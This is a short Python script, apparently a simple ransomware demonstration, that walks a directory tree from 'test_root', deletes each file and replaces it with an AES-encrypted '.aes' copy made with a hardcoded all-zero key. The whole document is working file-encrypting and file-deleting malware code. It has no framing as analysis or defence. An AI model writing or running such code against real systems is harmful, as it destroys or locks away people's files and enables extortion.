import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

key = b'0000000000000000'

def traverse(root_dir):
  print('traversing: ' + root_dir)
  for path, subdirs, files in os.walk(root_dir):
    for subdir in subdirs:
      traverse(os.path.join(path, subdir))
      print('exiting subdir: ' + subdir)
    for f in files:
      print('found file: ' + f)
      filepath = os.path.join(path, f)
      filename_split = os.path.splitext(filepath)

      if (filename_split[1] != '.aes'):

        plain_file = open(filepath, 'rb')
        plain_data = plain_file.read()
        plain_file.close()

        os.remove(filepath)

        cipher = AES.new(key, AES.MODE_EAX, get_random_bytes(16))
        ciphertext, tag = cipher.encrypt_and_digest(
            pad(plain_data, AES.block_size))

        out_filename = filepath + '.aes'

        with open(f'{out_filename}', 'wb') as encrypted_file:
          encrypted_file.write(cipher.nonce)
          encrypted_file.write(tag)
          encrypted_file.write(ciphertext)

        encrypted_file.close()

traverse('test_root')
